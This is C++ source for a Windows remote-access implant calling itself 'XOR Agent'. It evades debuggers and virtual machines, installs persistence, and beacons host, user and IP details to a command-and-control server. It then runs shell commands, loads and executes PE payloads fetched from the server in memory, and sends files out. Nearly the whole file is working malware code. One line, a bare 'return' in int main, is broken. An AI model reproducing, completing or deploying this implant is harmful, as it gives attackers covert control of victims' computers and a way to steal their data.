#include <windows.h>
#include <iostream>
#include <thread>
#include <chrono>
#include <sstream>
#include "config.h"
#include "system_utils.h"
#include "base64.h"
#include "crypt.h"
#include "http_client.h"
#include "task.h"
#include "pe-exec.h"
#include "file_utils.h"
#include "persistence.h"
#include "debug_detection.h"
using namespace std;

#ifdef ANTI_VM_ENABLED
extern "C" bool is_virtual_machine();
#endif

void parse_command_type(const string& command, string& types, string& value) {
    size_t sep1 = command.find('\'');
    if (sep1 == string::npos) {
        types = "cmd";
        value = command;
        return;
    }

    size_t sep2 = command.find('\'', sep1 + 1);
    if (sep2 == string::npos) {
        types = "cmd";
        value = command;
        return;
    }

    types = command.substr(sep1 + 1, sep2 - sep1 - 1);

    size_t colon = command.find(':', sep2);
    if (colon == string::npos) {
        types = "cmd";
        value = command;
        return;
    }

    size_t sep3 = command.find('\'', colon);
    if (sep3 == string::npos) {
        types = "cmd";
        value = command;
        return;
    }

    size_t sep4 = command.find('\'', sep3 + 1);
    if (sep4 == string::npos) {
        value = command.substr(sep3 + 1);
        size_t end = value.find_last_not_of(" \t\r\n'");
        if (end != string::npos) {
            value = value.substr(0, end + 1);
        }
    } else {
        value = command.substr(sep3 + 1, sep4 - sep3 - 1);
    }
}

string extract_filename(const string& command_type, const string& command_value) {
    if (command_type != "download") {
        return "";
    }

    return command_value;
}


string send_beacon(const string& agent_id, const string& results_data = "") {
    string hostname = get_hostname();
    string username = get_username();
    string process_name = get_process_name();
    string ip_pub = getPublicIP();
    ostringstream ss;
    ss << "{";
    ss << "\"agent_id\":\"" << agent_id << "\",";
    ss << "\"hostname\":\"" << hostname << "\",";
    ss << "\"username\":\"" << username << "\",";
    ss << "\"process_name\":\"" << process_name << "\",";
    ss << "\"ip_address\":\"" << ip_pub << "\",";
    ss << "\"results\":\"" << results_data << "\"";
    ss << "}";

    string beacon_json = ss.str();

    #ifdef _DEBUG
    cout << "[BEACON] JSON: " << beacon_json << endl;
    #endif

    string xor_encrypted = xor_data(beacon_json, XOR_KEY);

    string b64_encoded = base64_encode(xor_encrypted);

    #ifdef _DEBUG
    cout << "[BEACON] Sending to " << XOR_SERVERS << ":" << XOR_PORT << RESULTS_PATH << endl;
    #endif

    string response = http_post(
        XOR_SERVERS,
        XOR_PORT,
        RESULTS_PATH,
        USER_AGENT,
        HEADER,
        b64_encoded,
        USE_HTTPS
    );

    return response;
}


vector<pair<int64_t, string>> fetch_commands(const string& agent_id) {
    vector<pair<int64_t, string>> commands;

    ostringstream ss;
    ss << "{\"agent_id\":\"" << agent_id << "\"}";
    string request_json = ss.str();

    string xor_encrypted = xor_data(request_json, XOR_KEY);

    string b64_encoded = base64_encode(xor_encrypted);

    #ifdef _DEBUG
    cout << "[COMMAND] Fetching commands from /api/command" << endl;
    #endif

    string response = http_post(
        XOR_SERVERS,
        XOR_PORT,
        "/api/command",
        USER_AGENT,
        HEADER,
        b64_encoded,
        USE_HTTPS
    );

    if (response.empty()) {
        #ifdef _DEBUG
        cerr << "[COMMAND] No response from server" << endl;
        #endif
        return commands;
    }

    string xor_response = base64_decode(response);

    string clear_response = xor_data(xor_response, XOR_KEY);

    #ifdef _DEBUG
    cout << "[COMMAND] Response: " << clear_response << endl;
    #endif

    size_t commands_pos = clear_response.find("\"commands\":[");
    if (commands_pos == string::npos) {
        return commands;
    }

    size_t pos = commands_pos + 12;

    while (pos < clear_response.length()) {
        // Skip whitespace
        while (pos < clear_response.length() && (clear_response[pos] == ' ' || clear_response[pos] == '\t' || clear_response[pos] == '\n')) pos++;

        if (pos >= clear_response.length() || clear_response[pos] == ']') break;

        if (clear_response[pos] == ',') {
            pos++;
            continue;
        }

        if (clear_response[pos] == '{') {
            pos++;

            int64_t cmd_id = -1;
            string cmd_text = "";

            while (pos < clear_response.length() && clear_response[pos] != '}') {
                while (pos < clear_response.length() && (clear_response[pos] == ' ' || clear_response[pos] == '\t')) pos++;

                if (clear_response[pos] == ',') {
                    pos++;
                    continue;
                }

                if (clear_response.substr(pos, 5) == "\"id\":") {
                    pos += 5;
                    while (pos < clear_response.length() && (clear_response[pos] == ' ' || clear_response[pos] == '\t')) pos++;

                    size_t end = pos;
                    while (end < clear_response.length() && isdigit(clear_response[end])) end++;
                    cmd_id = atoll(clear_response.substr(pos, end - pos).c_str());
                    pos = end;
                }
                else if (clear_response.substr(pos, 11) == "\"command\":\"") {
                    pos += 11;
                    size_t end = pos;
                    while (end < clear_response.length()) {
                        if (clear_response[end] == '\\') {
                            end += 2;
                            continue;
                        }
                        if (clear_response[end] == '"') break;
                        end++;
                    }
                    cmd_text = clear_response.substr(pos, end - pos);
                    pos = end + 1;
                } else {
                    pos++;
                }
            }

            if (cmd_id != -1 && !cmd_text.empty()) {
                commands.push_back(make_pair(cmd_id, cmd_text));
                #ifdef _DEBUG
                cout << "[COMMAND] Parsed: ID=" << cmd_id << " CMD=" << cmd_text << endl;
                #endif
            }

            pos++;
        } else {
            pos++;
        }
    }

    #ifdef _DEBUG
    cout << "[COMMAND] Fetched " << commands.size() << " command(s)" << endl;
    #endif

    return commands;
}

string fetch_pe_data(int64_t command_id) {
    ostringstream path_stream;
    path_stream << "/api/pe-data/" << command_id;
    string path = path_stream.str();

    #ifdef _DEBUG
    cout << "[PE-DATA] Fetching from: " << XOR_SERVERS << ":" << XOR_PORT << path << endl;
    #endif

    string response = http_get(
        XOR_SERVERS,
        XOR_PORT,
        path,
        USER_AGENT,
        HEADER,
        USE_HTTPS
    );

    if (response.empty()) {
        #ifdef _DEBUG
        cerr << "[PE-DATA] ❌ No response from server" << endl;
        #endif
        return "";
    }

    #ifdef _DEBUG
    cout << "[PE-DATA] Response length: " << response.length() << " bytes" << endl;
    #endif

    string xor_encrypted;
    try {
        xor_encrypted = base64_decode(response);
    } catch (const exception& e) {
        #ifdef _DEBUG
        cerr << "[PE-DATA] Base64 decode failed: " << e.what() << endl;
        #endif
        return "";
    }

    #ifdef _DEBUG
    cout << "[PE-DATA] XOR encrypted length: " << xor_encrypted.length() << " bytes" << endl;
    #endif

    string decrypted = xor_data(xor_encrypted, XOR_KEY);

    #ifdef _DEBUG
    cout << "[PE-DATA] Decrypted length: " << decrypted.length() << " bytes" << endl;
    #endif

    return decrypted;
}

bool submit_result(const string& agent_id, int64_t command_id, const string& output, bool success, const string& types, const string& filename = "") {
    string output_b64 = base64_encode(output);

    ostringstream ss;
    ss << "{";
    ss << "\"agent_id\":\"" << agent_id << "\",";
    ss << "\"command_id\":" << command_id << ",";
    ss << "\"output\":\"" << output_b64 << "\",";
    ss << "\"success\":" << (success ? "true" : "false") << ",";
    ss << "\"types\":\"" << types << "\"";

    if (!filename.empty()) {
        ss << ",\"filename\":\"" << filename << "\"";
    }

    ss << "}";
    string result_json = ss.str();

    #ifdef _DEBUG
    cout << "[RESULT] Submitting result for command " << command_id << endl;
    #endif

    string xor_encrypted = xor_data(result_json, XOR_KEY);

    string b64_encoded = base64_encode(xor_encrypted);

    string response = http_post(
        XOR_SERVERS,
        XOR_PORT,
        "/api/result",
        USER_AGENT,
        HEADER,
        b64_encoded,
        USE_HTTPS
    );

    if (response.empty()) {
        #ifdef _DEBUG
        cerr << "[RESULT] No response from server" << endl;
        #endif
        return false;
    }

    #ifdef _DEBUG
    cout << "[RESULT] Result submitted successfully" << endl;
    #endif

    return true;
}

void agent_run() {
    setvbuf(stdout, NULL, _IONBF, 0);

    if (!is_persistence_installed()) {
        #ifdef _DEBUG
        cout << "[*] Installing persistence..." << endl;
        #endif

        if (install_persistence()) {
            #ifdef _DEBUG
            cout << "[+] Persistence installed successfully" << endl;
            cout << get_persistence_status() << endl;
            #endif
        } else {
            #ifdef _DEBUG
            cerr << "[!] Failed to install persistence" << endl;
            #endif
        }
    } else {
        #ifdef _DEBUG
        cout << "[*] Persistence already installed" << endl;
        #endif
    }

    #ifdef _DEBUG
    cout << "==================================" << endl;
    cout << "  XOR Agent" << endl;
    cout << "==================================" << endl;
    cout << "[*] C2 Server: " << XOR_SERVERS << ":" << XOR_PORT << endl;
    cout << "[*] Beacon interval: " << BEACON_INTERVAL << " seconds" << endl;
    cout << "[*] Beacon path: " << RESULTS_PATH << endl;
    #endif

    string agent_id = generate_agent_id();

    #ifdef _DEBUG
    cout << "[*] Agent ID: " << agent_id << endl;
    #endif

    #ifdef _DEBUG
    cout << "[*] Sending initial check-in..." << endl;
    #endif

    string initial_response = send_beacon(agent_id, "");

    if (initial_response.empty()) {
        #ifdef _DEBUG
        cerr << "[!] Failed to contact C2. Will retry..." << endl;
        #endif
    } else {
        #ifdef _DEBUG
        cout << "[+] Check-in successful" << endl;
        #endif
    }

    while (true) {
        this_thread::sleep_for(chrono::seconds(BEACON_INTERVAL));

        #ifdef _DEBUG
        cout << "\n[*] ===== New Beacon Cycle =====" << endl;
        #endif

        #ifdef _DEBUG
        cout << "[*] Step 1: Sending heartbeat beacon..." << endl;
        #endif

        string beacon_response = send_beacon(agent_id, "");

        if (beacon_response.empty()) {
            #ifdef _DEBUG
            cerr << "[!] Beacon failed, skipping this cycle" << endl;
            #endif
            continue;
        }

        #ifdef _DEBUG
        cout << "[*] Step 2: Fetching commands..." << endl;
        #endif

        vector<pair<int64_t, string>> commands = fetch_commands(agent_id);
        if (commands.empty()) {
            #ifdef _DEBUG
            cout << "[*] No commands to execute" << endl;
            #endif
            continue;
        }

        #ifdef _DEBUG
        cout << "[*] Step 3: Executing " << commands.size() << " command(s)..." << endl;
        #endif

        for (size_t i = 0; i < commands.size(); i++) {
            int64_t cmd_id = commands[i].first;
            string cmd_text = commands[i].second;

            string cmd_type, cmd_value;
            parse_command_type(cmd_text, cmd_type, cmd_value);

            #ifdef _DEBUG
            cout << "[EXEC] Command " << cmd_id << " | Type: " << cmd_type << " | Value: " << cmd_value << endl;
            #endif

            string result;
            string result_type;
            bool success = true;

            // ===== TRAITEMENT PE-EXEC =====
            if (cmd_type == "pe-exec") {
                #ifdef _DEBUG
                cout << "[PE-EXEC] Detected PE-exec command for: " << cmd_value << endl;
                cout << "[PE-EXEC] Fetching PE data from server..." << endl;
                #endif

                string pe_data_json = fetch_pe_data(cmd_id);

                if (pe_data_json.empty()) {
                    result = "Error: Failed to fetch PE data from server";
                    result_type = "text";
                    success = false;

                    #ifdef _DEBUG
                    cerr << "[PE-EXEC] ❌ Failed to fetch PE data" << endl;
                    #endif
                } else {
                    #ifdef _DEBUG
                    cout << "[PE-EXEC] PE data received (" << pe_data_json.length() << " bytes)" << endl;
                    cout << "[PE-EXEC] Executing PE in memory..." << endl;
                    #endif

                    try {
                        result = handle_pe_exec(pe_data_json);
                        result_type = "text";

                        if (result.empty()) {
                            result = "Error: PE execution returned no output";
                            success = false;
                        } else if (result.find("Error:") != string::npos) {
                            success = false;
                            #ifdef _DEBUG
                            cerr << "[PE-EXEC] ❌ Execution error: " << result << endl;
                            #endif
                        } else {
                            success = true;
                            #ifdef _DEBUG
                            cout << "[PE-EXEC] Execution successful" << endl;
                            cout << "[PE-EXEC] Output length: " << result.length() << " bytes" << endl;
                            #endif
                        }
                    } catch (const exception& e) {
                        result = string("Error: Exception during PE execution: ") + e.what();
                        result_type = "text";
                        success = false;

                        #ifdef _DEBUG
                        cerr << "[PE-EXEC] ❌ Exception: " << e.what() << endl;
                        #endif
                    }
                }
            }
            else if (cmd_type == "cmd") {
                #ifdef _DEBUG
                cout << "[CMD] Executing: " << cmd_value << endl;
                #endif

                result = exec_cmd(cmd_value);
                result_type = "text";

                #ifdef _DEBUG
                cout << "[CMD] Output length: " << result.length() << " bytes" << endl;
                #endif
            }
            else if (cmd_type == "download") {
                #ifdef _DEBUG
                cout << "[DOWNLOAD] Downloading file: " << cmd_value << endl;
                #endif

                result = handle_download(cmd_value);
                result_type = "file";

                if (result.find("Error:") != string::npos) {
                    success = false;
                    #ifdef _DEBUG
                    cerr << "[DOWNLOAD] ❌ Failed: " << result << endl;
                    #endif
                } else {
                    #ifdef _DEBUG
                    cout << "[DOWNLOAD] ✅ File downloaded successfully" << endl;
                    #endif
                }
            }
            else if (cmd_type == "upload") {
                #ifdef _DEBUG
                cout << "[UPLOAD] Processing upload command" << endl;
                #endif

                result = handle_upload(cmd_value);
                result_type = "text";

                if (result.find("Error:") != string::npos || result.find("Failed") != string::npos) {
                    success = false;
                    #ifdef _DEBUG
                    cerr << "[UPLOAD] ❌ Failed: " << result << endl;
                    #endif
                } else {
                    #ifdef _DEBUG
                    cout << "[UPLOAD] ✅ Upload successful" << endl;
                    #endif
                }
            }
            else {
                result = "Error: Unknown command type: " + cmd_type;
                result_type = "text";
                success = false;

                #ifdef _DEBUG
                cerr << "[EXEC] ❌ Unknown command type: " << cmd_type << endl;
                #endif
            }

            #ifdef _DEBUG
            cout << "[RESULT] Submitting result for command " << cmd_id << endl;
            cout << "[RESULT] Success: " << (success ? "true" : "false") << endl;
            cout << "[RESULT] Type: " << result_type << endl;
            cout << "[RESULT] Output length: " << result.length() << " bytes" << endl;
            #endif

            bool submitted = submit_result(agent_id, cmd_id, result, success, result_type);

            if (submitted) {
                #ifdef _DEBUG
                cout << "[RESULT] ✅ Result submitted successfully" << endl;
                #endif
            } else {
                #ifdef _DEBUG
                cerr << "[RESULT] ❌ Failed to submit result" << endl;
                #endif
            }
        }

        #ifdef _DEBUG
        cout << "[+] ===== Cycle completed =====" << endl;
        #endif
    }
}

int main() {
    #ifdef ANTI_DEBUG_ENABLED
    is_debugged();
    #endif

    #ifdef ANTI_VM_ENABLED
    if (is_virtual_machine()) {
        #ifdef _DEBUG
        cerr << "[!] Virtual machine detected. Exiting." << endl;
        #endif
        return;
    }
    #endif
    try {
        agent_run();
    }
    catch (const exception& e) {
        #ifdef _DEBUG
        cerr << "[FATAL] " << e.what() << endl;
        #endif
        return 1;
    }

    return 0;
}
